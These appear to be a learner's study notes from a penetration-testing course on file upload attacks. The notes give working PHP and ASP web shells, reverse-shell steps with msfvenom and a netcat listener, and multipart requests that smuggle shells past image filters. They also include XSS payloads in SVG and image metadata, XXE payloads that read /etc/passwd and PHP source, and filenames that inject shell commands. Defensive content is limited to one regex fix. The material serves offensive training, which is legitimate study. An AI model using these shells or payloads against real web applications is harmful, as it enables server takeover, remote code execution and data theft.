Simple php shells (last one do execute commands directly):
```
<?php system($_GET["cmd"]); ?>
<?php system($_REQUEST["cmd"]); ?>
<?php system('ls'); ?>
```

# Absent Validation
If the webapp has not any form of validation filters on the uploaded files, we can upload any type of file. In this case we just need to know what is the programming language of the back-end of the webapp. We can use `Wappalyzer` for this or we can fuzz the [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) using `ffuf`. 

# Upload Exploitation
We can upload web shells (like the one in the beginning of this chapter), like simple php shells, or more complex php webshells like [phpbash](https://github.com/Arrexel/phpbash). In case we upload the `phpbash` shell, we just need to locate where the file has been stored and run it

```shell-session
http://SERVER_IP:PORT/uploads/phpbash.php
```

In case we uploaded our simple php shell, we need also to specify (other than the path of the file) a php command from the GET request like this:

```shell-session
http://SERVER_IP:PORT/uploads/shell.php?cmd=id
```

This is specific for `PHP`. In case the language is different, we can also upload very simple shells, for example in `asp`: 

```asp
<% eval request('cmd') %>
```

We can also upload reverse shells. One of the best (located in `/usr/share/webshells/php-reverse-shell.php`) can be used to obtain a reverse shell. We just need to modify these two lines: 

```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```

Once done we need to start a `nc` listener using the same port we specified in the `php-reverse-shell.php`. Once the listener is started we can trigger the php file and we will receive a connection. We can also use `msfvenom`:

```shell-session
Poiint@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```



# Client-Side Validation
Let's start talking about filters. Client-side validations are the weakest because it's basically checks in javascript codes, but since this is on our side, we can modify the source code and/or modify the html in order to don't call these functions. For example if images are only allowed (jpeg, jgp, png ecc...) we can do 2 technique to evade this filters:

The first would be to capture the request in burpsuite by sending a correct file, and once burp intercepts it (so we have bypassed the client-side) we can modify our request. For example, some of them could be the file name (from `shell.jgp TO shell.php`, and the actual POST data (from `file signature/all the binary code TO the simple php shell.`):

```
--------WebKitFormBoundary...
Content-Dispostiion: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/png

<?php system>($_GET["cmd"]); ?>
--------WebKitFormBoundary...
```

The second would be to disable front-end validation, like we said before. We can open the page inspector [`CTRL+SHIFT+C`] and then click on the profile image (or search it manually). We could see something like this: 

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

As we can see, we have two filters: `checkFile(this)` and `.jgp,.jpeg,.png`. We can delete these two things, or we can modify them by just adding `.php` in the `accept` or add `All Files`, or we can modify the javascript code by going into the console [`CTRL+SHIFT+K`] and by typing `checkfile`. This will give us some information about this function, and we can click the little arrow in the right to go to the source code. 
Once we did that, there will be no more filters and we can upload our php shell.

# Blacklist Filters
This is a back end filter. This basically means we have some extensions that are "banned". So we must find a way to bypass this filter. For example, the php could could look like this: 

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

As we can see, only `php, php7 and phps` are blacklisted. If the file that we are uploading contains there extension, we will be blocked. We can fuzz the [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) extensions to see which are allowed. We can use `Burpsuite Intruder` for that matter, adding the "FUZZ" parameter to `$.php$` and by disallowing the URL encoding (because our php extension payload contains the `.` so if we don't disable this option, it will be URL encoded). Once we find a non-blacklisted extension, we can upload a php shell using that extension. For example, using the php code before, we could use `.phar` since it's not blacklisted.

# Whitelisting Filters
Similar to blackfiltering, but in this case, only few extension are `allowed`. This is usually more secure than using a blacklist. An example of file extension whitelist could be: 

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

This code checks if the filename contains any whitelisted image. The problem here is that doesn't check if it actually ends with it. So we can execute what is called "Double Extensions". Since it checks for that match in the full file, we can apply two extensions in the filename, like `shell.jpg.php`. This will be a php file, that contains what needed to bypass the `regex` filter. In order to know what extensions are whitelisted, we can use the `web extensions` wordlist we listed before.
To fix, we would change the regex like this: 

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

This will consider the final extension.

But sometimes, for webserver misconfigurations, we could apply what is called the "Reverse Double Extension", which can be executed because the webserver allows a whitelist of a php extensions, even if the file doesn't end with that extension, for example: `shell.php.jpg`. Here the code that would allow this: 

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```
`/etc/apache2/mods-enabled/php7.4.conf` for the `Apache2` web server

There could be some php extensions still blacklisted. We can use the php wordlist we listed before and try various filenames. Other than php extensions, we can inject characters before or after the final extensions to cause the web application to misinterpreter the filename and execute the uploaded file as a php scripts. Here are some of these characters: 

- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

Example: `shell.php%00.jpg` (that works with php server with version below 5.x);
`shell.aspx:.jpg` (works only in windows servers).
This is a way to generate all of these type of extensions:
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```



# Type Filters

Other than extension, there could be filtering about the file content: For example, the `Content-Type` and/or the `File Content`.

For the `Content-Type`, we are talking about `image/jpg` , `image/jpeg` ecc... A piece of code that would regex this in our content-type request would be:  

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

As we can see, only 4 types of images are allowed: jpg, jpeg, png, and gif. We can fuzz this by using this [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt) using Burp Intruder. If we want to only check for images, we need to craft our wordlist like this: 
```shell-session
Poiint@htb[/htb]$ cat content-type.txt | grep 'image/' > image-content-types.txt
```

For the `File Content`, we are talking about the `MIME-Type` (Multipurpose Internet Mail Extensions). This is usually done by inspecting the first few bytes of the file's content, which contain the [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime). For example, if the file starts with (`GI87a` or `GIF89a`) this indicates that this is a  `GIF` image. In case you wanna use an image type that has non-printable bytes for their file signatures (likely most of them) you can add, for example, 4 dots (or how many you need) in the beginning of the file and then opening the file with `hexeditor file.ext`, then you will modify the X number of dots you added with the hex code for that specific file type. For example, for a jpeg file, you would add these 4 hex: `FF D8 FF DB`. 
You can check the file type using the `file` command. There could be a mixture of filters, for example `Allowed MIME type with a disallowed Content-Type`, an `Allowed MIME/Content-Type with a disallowed extension`, or a `Disallowed MIME/Content-Type with an allowed extension` and so on.

# Limited File Uploads

We can also upload file types such as `SVG`, `HTML`, `XML`, and some documents files. These files could allow us to introduce new vulnerabilities to the web app.

## XSS
Many file types may allow us to introduce a `Stored XSS` vulnerability to the web application by uploading maliciously crafted versions of them.
The most basic example is when a web application allows us to upload `HTML` files.
Another example of XSS attacks is web applications that display an image's metadata after its upload. For such web applications, we can include an XSS payload in one of the Metadata parameters that accept raw text, like the `Comment` or `Artist` parameters, as follows:

```shell-session
Poiint@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
Poiint@htb[/htb]$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```
if we change the image's MIME-Type to `text/html`, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed

Finally, XSS attacks can also be carried with `SVG` images, along with several other attacks. `Scalable Vector Graphics (SVG)` images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can modify their XML data to include an XSS payload. For example, we can write the following to `HTB.svg`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

## XXE
Similar attacks can be carried to lead to XXE exploitation. With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server. The following example can be used for an SVG image that leaks the content of (`/etc/passwd`):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

For File Upload exploitation, it may allow us to `locate the upload directory, identify allowed extensions, or find the file naming scheme`, which may become handy for further exploitation

To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Using XML data is not unique to SVG images, as it is also utilized by many types of documents, like `PDF`, `Word Documents`, `PowerPoint Documents`, among many others

## DoS
Finally, many file upload vulnerabilities may lead to a `Denial of Service (DOS)` attack on the web server. For example, we can use the previous XXE payloads to achieve DoS attacks, as discussed in the [Web Attacks](https://academy.hackthebox.com/module/details/134) module.

Furthermore, we can utilize a `Decompression Bomb` with file types that use data compression, like `ZIP` archives. If a web application automatically unzips a ZIP archive, it is possible to upload a malicious archive containing nested ZIP archives within it, which can eventually lead to many Petabytes of data, resulting in a crash on the back-end server.

Another possible DoS attack is a `Pixel Flood` attack with some image files that utilize image compression, like `JPG` or `PNG`. We can create any `JPG` image file with any image size (e.g. `500x500`), and then manually modify its compression data to say it has a size of (`0xffff x 0xffff`), which results in an image with a perceived size of 4 Gigapixels. When the web application attempts to display the image, it will attempt to allocate all of its memory to this image, resulting in a crash on the back-end server.

# Other Upload Attacks

## Injection in File Names

For example, if we name a file `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami`, and then the web application attempts to move the uploaded file with an OS command (e.g. `mv file /tmp`), then our file name would inject the `whoami` command, which would get executed, leading to remote code execution. 

Similarly, we may use an XSS payload in the file name (e.g. `<script>alert(window.origin);</script>`), which would get executed on the target's machine if the file name is displayed to them. We may also inject an SQL query in the file name (e.g. `file';select+sleep(5);--.jpg`),

## Upload Directory Disclosure
In some file upload forms, like a feedback form or a submission form, we may not have access to the link of our uploaded file and may not know the uploads directory. In such cases, we may utilize fuzzing to look for the uploads directory or even use other vulnerabilities (e.g., LFI/XXE) to find where the uploaded files are by reading the web applications source code, as we saw in the previous section. Furthermore, the [Web Attacks/IDOR](https://academy.hackthebox.com/module/details/134) module discusses various methods of finding where files may be stored and identifying the file naming scheme.
Another method we can use to disclose the uploads directory is through forcing error messages, as they often reveal helpful information for further exploitation. One attack we can use to cause such errors is uploading a file with a name that already exists or sending two identical requests simultaneously. This may lead the web server to show an error that it could not write the file, which may disclose the uploads directory. We may also try uploading a file with an overly long name (e.g., 5,000 characters). If the web application does not handle this correctly, it may also error out and disclose the upload directory.

## Windows-specific Attacks

We can also use a few `Windows-Specific` techniques in some of the attacks we discussed in the previous sections.

One such attack is using reserved characters, such as (`|`, `<`, `>`, `*`, or `?`), which are usually reserved for special uses like wildcards. If the web application does not properly sanitize these names or wrap them within quotes, they may refer to another file (which may not exist) and cause an error that discloses the upload directory. Similarly, we may use Windows reserved names for the uploaded file name, like (`CON`, `COM1`, `LPT1`, or `NUL`), which may also cause an error as the web application will not be allowed to write a file with this name.

Finally, we may utilize the Windows [8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename) to overwrite existing files or refer to files that do not exist. Older versions of Windows were limited to a short length for file names, so they used a Tilde character (`~`) to complete the file name, which we can use to our advantage.

For example, to refer to a file called (`hackthebox.txt`) we can use (`HAC~1.TXT`) or (`HAC~2.TXT`), where the digit represents the order of the matching files that start with (`HAC`). As Windows still supports this convention, we can write a file called (e.g. `WEB~.CONF`) to overwrite the `web.conf` file. Similarly, we may write a file that replaces sensitive system files. This attack can lead to several outcomes, like causing information disclosure through errors, causing a DoS on the back-end server, or even accessing private files.

## Advanced File Upload Attacks

In addition to all of the attacks we have discussed in this module, there are more advanced attacks that can be used with file upload functionalities. Any automatic processing that occurs to an uploaded file, like encoding a video, compressing a file, or renaming a file, may be exploited if not securely coded.

Some commonly used libraries may have public exploits for such vulnerabilities, like the AVI upload vulnerability leading to XXE in `ffmpeg`. However, when dealing with custom code and custom libraries, detecting such vulnerabilities requires more advanced knowledge and techniques, which may lead to discovering an advanced file upload vulnerability in some web applications.



# Prevention

For prevention check course content
